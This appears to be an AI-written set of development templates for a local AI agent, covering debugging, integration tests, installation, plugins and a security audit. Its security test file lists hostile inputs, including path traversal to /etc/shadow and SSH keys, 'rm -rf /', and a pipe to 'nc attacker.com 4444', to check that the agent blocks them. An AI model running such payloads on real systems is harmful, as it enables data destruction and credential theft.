# Additional Development Templates for Local AI Agent

## 1. Debugging Checklist

### Systematic Debugging Process

```markdown
# Debugging Checklist - [Component/Issue Name]

Date: [DATE]
Session: [X.Y]
Issue ID: BUG-[XXX]

## Issue Description
**Symptoms**: What is happening that shouldn't be
**Expected**: What should happen instead
**Frequency**: Always/Sometimes/Rarely
**First Noticed**: When/where the issue first appeared

## Initial Assessment
- [ ] Error reproduced locally
- [ ] Error message captured
- [ ] Stack trace saved
- [ ] Relevant logs collected
- [ ] System state documented

## Isolation Steps
- [ ] Minimal reproduction case created
- [ ] External dependencies ruled out
- [ ] Configuration issues checked
- [ ] Recent changes reviewed (last 3 commits)
- [ ] Related tests identified

## Investigation Tools Used
- [ ] Debugger (breakpoints set at: ...)
- [ ] Logging (added debug logs at: ...)
- [ ] Print statements (temporary)
- [ ] Performance profiler
- [ ] Memory profiler
- [ ] Network inspector

## Root Cause Analysis
### Hypothesis 1: [Description]
- Evidence for: 
- Evidence against:
- Test: [How to verify]
- Result: [Confirmed/Rejected]

### Hypothesis 2: [Description]
- Evidence for:
- Evidence against:
- Test: [How to verify]
- Result: [Confirmed/Rejected]

## Solution
**Root Cause**: [Identified cause]
**Fix Applied**: [Description of fix]
**Files Modified**: 
- `path/to/file1.py` - [what changed]
- `path/to/file2.py` - [what changed]

## Verification
- [ ] Fix tested locally
- [ ] Original issue resolved
- [ ] No regression in related features
- [ ] New tests added to prevent recurrence
- [ ] Performance impact assessed

## Lessons Learned
1. [What could have prevented this]
2. [What would make debugging easier next time]
3. [Documentation or monitoring needed]
```

### Common Debugging Patterns

```python
# src/utils/debug_helpers.py

import functools
import traceback
import json
from typing import Any, Callable
import logging

logger = logging.getLogger(__name__)

def debug_trace(func: Callable) -> Callable:
    """Decorator to trace function calls during debugging"""
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        func_name = func.__name__
        logger.debug(f"ENTER {func_name}")
        logger.debug(f"Args: {args}")
        logger.debug(f"Kwargs: {kwargs}")
        
        try:
            result = func(*args, **kwargs)
            logger.debug(f"EXIT {func_name} - Result: {result}")
            return result
        except Exception as e:
            logger.error(f"ERROR in {func_name}: {str(e)}")
            logger.error(f"Traceback: {traceback.format_exc()}")
            raise
    
    return wrapper

def debug_state(obj: Any, name: str = "Object"):
    """Print detailed state of an object for debugging"""
    print(f"\n=== DEBUG STATE: {name} ===")
    print(f"Type: {type(obj)}")
    print(f"ID: {id(obj)}")
    
    if hasattr(obj, '__dict__'):
        print("Attributes:")
        for key, value in obj.__dict__.items():
            print(f"  {key}: {repr(value)}")
    
    if hasattr(obj, '__len__'):
        print(f"Length: {len(obj)}")
    
    print("Methods:")
    for attr in dir(obj):
        if not attr.startswith('_') and callable(getattr(obj, attr)):
            print(f"  {attr}()")
    print("===================\n")

class DebugContext:
    """Context manager for debugging specific code sections"""
    
    def __init__(self, name: str, verbose: bool = True):
        self.name = name
        self.verbose = verbose
        self.start_time = None
    
    def __enter__(self):
        self.start_time = time.time()
        if self.verbose:
            logger.debug(f"DEBUG ENTER: {self.name}")
            # Capture initial state
            self.initial_memory = psutil.Process().memory_info().rss
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        duration = time.time() - self.start_time
        if self.verbose:
            logger.debug(f"DEBUG EXIT: {self.name} ({duration:.3f}s)")
            if exc_type:
                logger.error(f"Exception in {self.name}: {exc_val}")
            # Memory delta
            final_memory = psutil.Process().memory_info().rss
            memory_delta = (final_memory - self.initial_memory) / 1024 / 1024
            logger.debug(f"Memory delta: {memory_delta:+.1f}MB")
```

## 2. Integration Test Scenarios

### Integration Test Suite Template

```python
# tests/integration/test_end_to_end_scenarios.py

import pytest
import asyncio
import tempfile
import shutil
from pathlib import Path
from typing import Dict, Any

from src.agent import Agent
from src.mcp_client import MCPClient
from tests.fixtures import create_test_environment

class TestEndToEndScenarios:
    """
    Integration tests for complete user workflows.
    
    These tests verify that all components work together correctly
    in realistic usage scenarios.
    """
    
    @pytest.fixture
    async def test_environment(self):
        """Create isolated test environment"""
        with tempfile.TemporaryDirectory() as temp_dir:
            env = await create_test_environment(temp_dir)
            yield env
            # Cleanup
            await env.cleanup()
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_file_organization_workflow(self, test_environment):
        """
        Test complete file organization workflow.
        
        Scenario:
        1. User requests to organize downloads folder
        2. Agent analyzes files
        3. Creates organized structure
        4. Moves files appropriately
        5. Reports results
        """
        # Setup test files
        downloads_dir = test_environment.create_test_files([
            "report.pdf",
            "image.jpg", 
            "video.mp4",
            "document.docx",
            "archive.zip"
        ])
        
        # Execute task
        agent = test_environment.agent
        result = await agent.execute_task(
            "Organize my downloads folder by file type"
        )
        
        # Verify results
        assert result.success
        assert (downloads_dir / "Documents" / "report.pdf").exists()
        assert (downloads_dir / "Images" / "image.jpg").exists()
        assert (downloads_dir / "Videos" / "video.mp4").exists()
        
        # Verify audit log
        assert len(result.operations) == 5
        assert all(op.type == "file_move" for op in result.operations)
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_code_analysis_workflow(self, test_environment):
        """
        Test code analysis with Claude Code integration.
        
        Scenario:
        1. User requests code review
        2. Agent gathers code context
        3. Routes to Claude Code
        4. Receives and formats results
        5. Applies suggested improvements
        """
        # Create test project
        project_dir = test_environment.create_python_project()
        
        # Execute analysis
        result = await test_environment.agent.execute_task(
            "Review this Python project and suggest improvements",
            context={"project_path": str(project_dir)}
        )
        
        # Verify Claude Code was called
        assert result.tools_used == ["claude_code_execute"]
        assert result.suggestions is not None
        assert len(result.suggestions) > 0
        
        # Verify suggestions were saved
        review_file = project_dir / "code_review.md"
        assert review_file.exists()
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_screenshot_context_workflow(self, test_environment):
        """
        Test screenshot-based task execution.
        
        Scenario:
        1. User asks about current screen content
        2. Screenshot is captured
        3. OCR extracts text
        4. Agent analyzes and responds
        5. Context is preserved for follow-up
        """
        # Mock screenshot content
        test_environment.mock_screenshot("test_window.png")
        
        # First query
        result1 = await test_environment.agent.execute_task(
            "What application is currently open?"
        )
        
        assert result1.success
        assert "test_window" in result1.response
        
        # Follow-up query using context
        result2 = await test_environment.agent.execute_task(
            "Click on the save button"
        )
        
        assert result2.success
        assert result2.tools_used == ["desktop_automation"]
```

### Integration Test Configuration

```yaml
# tests/integration/test_config.yaml

integration_tests:
  timeouts:
    default: 30  # seconds
    complex_operations: 60
    ai_operations: 120
  
  mock_services:
    ollama:
      enabled: true
      responses_file: "tests/fixtures/ollama_responses.json"
    
    claude_code:
      enabled: true
      simulate_delay: true
      delay_range: [1, 3]  # seconds
    
    google_cli:
      enabled: true
      mock_results: "tests/fixtures/google_results.json"
  
  test_data:
    sample_files_dir: "tests/fixtures/sample_files"
    screenshot_dir: "tests/fixtures/screenshots"
    
  scenarios:
    - name: "file_organization"
      required_services: ["filesystem", "ollama"]
      timeout: 30
      
    - name: "code_generation"
      required_services: ["filesystem", "claude_code", "ollama"]
      timeout: 120
      
    - name: "ui_automation"
      required_services: ["screenshot_context", "desktop_automation", "ollama"]
      timeout: 45
```

## 3. Deployment Preparation

### Deployment Checklist

```markdown
# Deployment Preparation Checklist

## Pre-Deployment Verification

### Code Quality
- [ ] All tests passing (unit, integration, performance)
- [ ] Code coverage > 80%
- [ ] No TODO comments in production code
- [ ] All debug code removed
- [ ] Linting passes with no warnings

### Security Audit
- [ ] Dependencies scanned for vulnerabilities
- [ ] Secrets removed from codebase
- [ ] Permissions model tested
- [ ] Input validation comprehensive
- [ ] Audit logging functional

### Performance
- [ ] Load testing completed
- [ ] Memory leaks checked
- [ ] Response times within SLA
- [ ] Resource usage acceptable
- [ ] Concurrent operation tested

### Documentation
- [ ] README.md complete and accurate
- [ ] API documentation generated
- [ ] Configuration guide written
- [ ] Troubleshooting guide created
- [ ] Change log updated

## Deployment Package

### Package Structure
```
local-ai-agent-v1.0.0/
├── bin/
│   ├── ai-agent           # Main executable
│   └── ai-agent-setup     # Setup script
├── lib/
│   └── ai_agent/          # Python package
├── config/
│   ├── default.yaml       # Default configuration
│   └── example.env        # Environment example
├── mcp-servers/
│   └── [all servers]      # MCP server implementations
├── docs/
│   ├── README.md
│   ├── INSTALL.md
│   └── API.md
└── requirements.txt
```

### Installation Script
```bash
#!/bin/bash
# install.sh - Local AI Agent Installation Script

set -e

echo "Installing Local AI Agent..."

# Check Python version
python_version=$(python3 --version | cut -d' ' -f2)
required_version="3.8"

if ! python3 -c "import sys; exit(0 if sys.version_info >= (3,8) else 1)"; then
    echo "Error: Python 3.8+ required, found $python_version"
    exit 1
fi

# Check Ollama installation
if ! command -v ollama &> /dev/null; then
    echo "Warning: Ollama not found. Please install from https://ollama.ai"
fi

# Create virtual environment
echo "Creating virtual environment..."
python3 -m venv ~/.local/share/ai-agent/venv

# Activate and install
source ~/.local/share/ai-agent/venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Create directories
mkdir -p ~/.config/ai-agent
mkdir -p ~/.local/share/ai-agent/logs
mkdir -p ~/.local/share/ai-agent/data

# Copy configuration
cp config/default.yaml ~/.config/ai-agent/config.yaml
cp config/example.env ~/.config/ai-agent/.env.example

# Install MCP servers
echo "Installing MCP servers..."
python setup_mcp_servers.py

# Create launcher script
cat > ~/.local/bin/ai-agent << 'EOF'
#!/bin/bash
source ~/.local/share/ai-agent/venv/bin/activate
python -m ai_agent "$@"
EOF

chmod +x ~/.local/bin/ai-agent

echo "Installation complete!"
echo "Run 'ai-agent --help' to get started"
```

### Systemd Service File
```ini
# /etc/systemd/system/ai-agent.service

[Unit]
Description=Local AI Agent Service
After=network.target

[Service]
Type=simple
User=%i
WorkingDirectory=/home/%i/.local/share/ai-agent
Environment="PATH=/home/%i/.local/bin:/usr/local/bin:/usr/bin:/bin"
ExecStart=/home/%i/.local/share/ai-agent/venv/bin/python -m ai_agent --daemon
Restart=on-failure
RestartSec=10

# Security settings
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/home/%i/Documents /home/%i/Downloads /home/%i/Desktop

[Install]
WantedBy=multi-user.target
```

## 4. Plugin Development Guide

### Plugin Architecture

```python
# src/plugins/base_plugin.py

from abc import ABC, abstractmethod
from typing import Dict, Any, List
from dataclasses import dataclass

@dataclass
class PluginMetadata:
    """Plugin metadata"""
    name: str
    version: str
    author: str
    description: str
    requires: List[str] = None  # Required plugins
    
class BasePlugin(ABC):
    """
    Base class for all AI Agent plugins.
    
    Plugins can:
    - Add new MCP tools
    - Extend agent capabilities
    - Add UI components
    - Integrate external services
    """
    
    def __init__(self, agent_context: 'AgentContext'):
        self.context = agent_context
        self.logger = agent_context.get_logger(self.metadata.name)
        
    @property
    @abstractmethod
    def metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        pass
    
    @abstractmethod
    async def initialize(self) -> None:
        """Initialize plugin (called once at startup)"""
        pass
    
    @abstractmethod
    async def shutdown(self) -> None:
        """Clean shutdown (called on agent stop)"""
        pass
    
    def register_tools(self) -> List[Dict[str, Any]]:
        """
        Register MCP tools provided by this plugin.
        
        Returns:
            List of tool definitions
        """
        return []
    
    def register_handlers(self) -> Dict[str, Callable]:
        """
        Register event handlers.
        
        Returns:
            Dict mapping event names to handlers
        """
        return {}
```

### Example Plugin Implementation

```python
# plugins/github_integration/plugin.py

from src.plugins import BasePlugin, PluginMetadata
from typing import Dict, Any
import aiohttp

class GitHubIntegrationPlugin(BasePlugin):
    """
    GitHub integration plugin for AI Agent.
    
    Adds capabilities:
    - Create/manage issues
    - Review pull requests  
    - Automate releases
    - Monitor repositories
    """
    
    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="github_integration",
            version="1.0.0",
            author="AI Agent Team",
            description="GitHub integration for repository management",
            requires=["git"]
        )
    
    async def initialize(self) -> None:
        """Initialize GitHub connection"""
        self.token = self.context.get_config("github.token")
        if not self.token:
            raise ValueError("GitHub token not configured")
        
        self.session = aiohttp.ClientSession(
            headers={"Authorization": f"token {self.token}"}
        )
        self.logger.info("GitHub integration initialized")
    
    async def shutdown(self) -> None:
        """Close connections"""
        await self.session.close()
    
    def register_tools(self) -> List[Dict[str, Any]]:
        """Register GitHub tools"""
        return [
            {
                "name": "github_create_issue",
                "description": "Create a GitHub issue",
                "parameters": {
                    "repository": {"type": "string", "required": True},
                    "title": {"type": "string", "required": True},
                    "body": {"type": "string", "required": True},
                    "labels": {"type": "array", "items": {"type": "string"}}
                },
                "handler": self.create_issue
            },
            {
                "name": "github_review_pr",
                "description": "Review a pull request",
                "parameters": {
                    "repository": {"type": "string", "required": True},
                    "pr_number": {"type": "integer", "required": True}
                },
                "handler": self.review_pr
            }
        ]
    
    async def create_issue(self, repository: str, title: str, 
                          body: str, labels: List[str] = None) -> Dict:
        """Create a GitHub issue"""
        url = f"https://api.github.com/repos/{repository}/issues"
        data = {
            "title": title,
            "body": body,
            "labels": labels or []
        }
        
        async with self.session.post(url, json=data) as response:
            return await response.json()
```

### Plugin Configuration

```yaml
# plugins/github_integration/config.yaml

plugin:
  name: github_integration
  enabled: true
  
  config:
    # User-specific configuration
    token: ${GITHUB_TOKEN}  # From environment
    default_repository: "user/repo"
    
    # Plugin behavior
    auto_assign: true
    default_labels: ["ai-agent"]
    
    # Rate limiting
    max_requests_per_hour: 1000
    
  # Tool-specific settings
  tools:
    github_create_issue:
      timeout: 30
      retry_count: 3
      
    github_review_pr:
      timeout: 60
      include_diff: true
      max_diff_size: 10000
```

## 5. Security Audit Checklist

### Comprehensive Security Review

```markdown
# Security Audit Checklist

Date: [DATE]
Version: [VERSION]
Auditor: [NAME]

## Code Security

### Input Validation
- [ ] All user inputs sanitized
- [ ] Path traversal prevention implemented
- [ ] Command injection prevention in place
- [ ] SQL injection not possible (if applicable)
- [ ] File upload restrictions enforced

### Authentication & Authorization
- [ ] API keys properly managed
- [ ] No hardcoded credentials
- [ ] Permission checks on all operations
- [ ] Session management secure
- [ ] Rate limiting implemented

### Data Protection
- [ ] Sensitive data encrypted at rest
- [ ] Secure communication (TLS/SSL)
- [ ] PII handling compliant
- [ ] Logs sanitized of sensitive data
- [ ] Secure deletion implemented

## Dependency Security

### Package Audit
```bash
# Run these commands
pip-audit
safety check
bandit -r src/

# Document results:
Vulnerabilities found: [NUMBER]
Critical: [NUMBER]
High: [NUMBER]
Medium: [NUMBER]
Low: [NUMBER]
```

### Dependency Review
- [ ] All dependencies necessary
- [ ] Dependencies up to date
- [ ] No deprecated packages
- [ ] License compliance verified
- [ ] Supply chain risks assessed

## System Security

### File System
- [ ] Sandbox boundaries enforced
- [ ] Symlink attacks prevented
- [ ] Temporary file handling secure
- [ ] File permissions appropriate
- [ ] No world-writable directories

### Process Security
- [ ] Privilege escalation prevented
- [ ] Resource limits enforced
- [ ] Signal handling secure
- [ ] No shell execution of user input
- [ ] Process isolation implemented

### Network Security
- [ ] Firewall rules documented
- [ ] Only necessary ports open
- [ ] API endpoints authenticated
- [ ] CORS properly configured
- [ ] DNS rebinding prevented

## Operational Security

### Logging & Monitoring
- [ ] Security events logged
- [ ] Log rotation configured
- [ ] Monitoring alerts set up
- [ ] Anomaly detection in place
- [ ] Audit trail complete

### Incident Response
- [ ] Incident response plan exists
- [ ] Contact information current
- [ ] Backup/restore tested
- [ ] Rollback procedure documented
- [ ] Security patches process defined

## Compliance

### Privacy
- [ ] Privacy policy accurate
- [ ] Data retention policy enforced
- [ ] Right to deletion implemented
- [ ] Data portability supported
- [ ] Consent mechanisms in place

### Standards
- [ ] OWASP Top 10 addressed
- [ ] CWE Top 25 reviewed
- [ ] Industry standards met
- [ ] Regulatory compliance verified
- [ ] Security headers implemented

## Test Results

### Security Testing
- [ ] Penetration testing completed
- [ ] Fuzzing performed
- [ ] Static analysis clean
- [ ] Dynamic analysis passed
- [ ] Manual review completed

### Vulnerability Summary
| Severity | Count | Resolved | Accepted Risk |
|----------|-------|----------|---------------|
| Critical | 0     | N/A      | N/A           |
| High     | 0     | N/A      | N/A           |
| Medium   | 0     | N/A      | N/A           |
| Low      | 0     | N/A      | N/A           |

## Sign-off

- [ ] Development team review
- [ ] Security team approval
- [ ] Management sign-off
- [ ] Documentation updated
- [ ] Training completed

Approved for deployment: [ ] Yes [ ] No
Conditions: [LIST ANY CONDITIONS]
```

### Security Testing Scripts

```python
# tests/security/test_security.py

import pytest
import os
import tempfile
from pathlib import Path

class TestSecurityMeasures:
    """Security-focused test suite"""
    
    def test_path_traversal_prevention(self, agent):
        """Verify path traversal attacks are blocked"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "~/../../root/.ssh/id_rsa",
            "Documents/../../../etc/shadow"
        ]
        
        for path in malicious_paths:
            with pytest.raises(SecurityError):
                agent.read_file(path)
    
    def test_command_injection_prevention(self, agent):
        """Verify command injection is prevented"""
        malicious_inputs = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "$(cat /etc/passwd)",
            "`rm -rf /`"
        ]
        
        for input_str in malicious_inputs:
            result = agent.process_file_command(input_str)
            # Should either sanitize or reject
            assert "rm" not in str(result)
            assert "cat /etc/passwd" not in str(result)
    
    def test_rate_limiting(self, agent):
        """Verify rate limiting works"""
        # Attempt rapid requests
        results = []
        for i in range(150):  # Over limit
            try:
                result = agent.execute_task("test")
                results.append(result)
            except RateLimitError:
                break
        
        # Should hit rate limit before 150
        assert len(results) < 150
    
    def test_permission_enforcement(self, agent):
        """Verify permissions are enforced"""
        # Try operations without permission
        with pytest.raises(PermissionError):
            agent.delete_file("/important/file.txt")
        
        # Grant permission and retry
        agent.grant_permission("delete_file", "/important/file.txt")
        # Now should work (in test environment)
        result = agent.delete_file("/important/file.txt")
        assert result.success
```

These additional templates provide comprehensive coverage for:
1. **Debugging** - Systematic approach to finding and fixing issues
2. **Integration Testing** - Real-world scenario testing
3. **Deployment** - Production-ready packaging and installation
4. **Plugin Development** - Extensibility framework
5. **Security Auditing** - Comprehensive security review process

Each template includes practical examples and can be directly used by Claude Code during development. Would you like me to create any other specific templates or elaborate on any of these?